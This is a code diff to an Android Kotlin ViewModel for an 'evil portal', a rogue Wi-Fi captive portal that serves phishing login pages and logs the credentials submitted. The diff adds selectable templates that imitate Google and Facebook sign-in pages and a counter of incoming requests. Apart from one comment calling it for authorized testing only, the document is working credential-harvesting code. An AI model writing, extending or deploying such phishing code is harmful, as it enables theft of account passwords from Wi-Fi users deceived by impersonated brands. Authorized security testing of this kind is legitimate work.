@@ -52,6 +52,16 @@ class EvilPortalViewModel : ViewModel() {
     // Titre affiché sur la page de phishing (personnalisable)
     var portalTitle = "Free WiFi — Sign in"
 
+    /** Modèles de page captive (test autorisé uniquement). */
+    enum class PortalTemplate { GENERIC, GOOGLE, FACEBOOK, FREE_WIFI }
+    private val _template = MutableStateFlow(PortalTemplate.GENERIC)
+    val template: StateFlow<PortalTemplate> = _template
+    fun setTemplate(t: PortalTemplate) { _template.value = t }
+
+    // Nombre de requêtes HTTP reçues (retour visuel « ça marche »).
+    private val _requests = MutableStateFlow(0)
+    val requests: StateFlow<Int> = _requests
+
     fun initialize(context: Context) {
         this.context = context.applicationContext
         wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
@@ -136,6 +146,7 @@ class EvilPortalViewModel : ViewModel() {
         val requestLine = reader.readLine() ?: run { client.close(); return }
         // Trace chaque requête : permet de vérifier qu'un client atteint bien le portail.
         AppLog.log("EvilPortal", "Request from ${client.inetAddress?.hostAddress ?: "?"}: $requestLine")
+        _requests.value = _requests.value + 1
         val method = requestLine.substringBefore(" ")
         var contentLength = 0
         var line: String?
@@ -179,16 +190,45 @@ class EvilPortalViewModel : ViewModel() {
         AppLog.log("EvilPortal", "Captured $entry")
     }
 
-    private fun portalHtml(): String = """
+    private fun portalHtml(): String = when (_template.value) {
+        PortalTemplate.GOOGLE -> loginPage(
+            title = "Sign in - Google Accounts", heading = "Sign in",
+            sub = "Use your Google Account", userField = "email",
+            userLabel = "Email or phone", accent = "#1a73e8", bg = "#ffffff"
+        )
+        PortalTemplate.FACEBOOK -> loginPage(
+            title = "Log in to Facebook", heading = "facebook",
+            sub = "Log in to continue", userField = "email",
+            userLabel = "Email address or phone number", accent = "#1877f2", bg = "#f0f2f5"
+        )
+        PortalTemplate.FREE_WIFI -> loginPage(
+            title = "Free WiFi — Sign in", heading = "Free WiFi",
+            sub = "Sign in to access the internet", userField = "username",
+            userLabel = "Email or username", accent = "#00a0a0", bg = "#f0f2f5"
+        )
+        PortalTemplate.GENERIC -> loginPage(
+            title = portalTitle, heading = portalTitle,
+            sub = "Please sign in to continue", userField = "username",
+            userLabel = "Email or username", accent = "#1877f2", bg = "#f0f2f5"
+        )
+    }
+
+    /** Gabarit de page de connexion. Champs nommés email/username + password (capturés). */
+    private fun loginPage(
+        title: String, heading: String, sub: String,
+        userField: String, userLabel: String, accent: String, bg: String
+    ): String = """
         <!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1">
-        <title>$portalTitle</title>
-        <style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;padding-top:60px}
-        .c{background:#fff;padding:24px;border-radius:8px;box-shadow:0 1px 4px #0002;width:300px}
-        input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}
-        button{width:100%;padding:10px;background:#1877f2;color:#fff;border:0;border-radius:6px;font-size:16px}</style>
-        </head><body><div class=c><h2>$portalTitle</h2>
+        <title>$title</title>
+        <style>body{font-family:Arial,Helvetica,sans-serif;background:$bg;display:flex;justify-content:center;padding-top:50px;margin:0}
+        .c{background:#fff;padding:28px;border-radius:10px;box-shadow:0 2px 10px #0002;width:320px}
+        h2{margin:0 0 4px;text-align:center;color:$accent}
+        p.s{margin:0 0 16px;text-align:center;color:#555;font-size:14px}
+        input{width:100%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:6px}
+        button{width:100%;padding:12px;background:$accent;color:#fff;border:0;border-radius:6px;font-size:16px;margin-top:8px}</style>
+        </head><body><div class=c><h2>$heading</h2><p class=s>$sub</p>
         <form method=post action="/login">
-        <input name=username placeholder="Email or username" autofocus>
+        <input name=$userField placeholder="$userLabel" autofocus>
         <input name=password type=password placeholder="Password">
         <button type=submit>Sign in</button></form></div></body></html>
     """.trimIndent()
